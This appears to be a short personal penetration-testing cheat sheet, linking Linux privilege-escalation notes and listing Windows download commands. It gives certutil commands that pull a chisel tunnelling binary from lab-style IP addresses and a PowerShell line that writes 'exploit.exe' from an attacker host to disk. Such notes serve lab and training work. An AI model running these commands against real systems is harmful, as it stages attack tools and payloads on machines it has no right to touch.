# Linux:
[[TCM Linux Privilege Escalation Notes]]
[[740i Linux-PrivEsc]]

------------------------------------
# Windows:

#certutil 
```shell
certutil -urlcache -split -f "http://10.10.16.7:8000/chisel_windows"
certutil -urlcache -split -f "http://10.10.14.39:8000/chisel_1.8.1_windows_amd64.exe"
```


```powershell
#Downloads file & writes to disk
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.163:8080/exploit.exe', 'exploit.exe')
```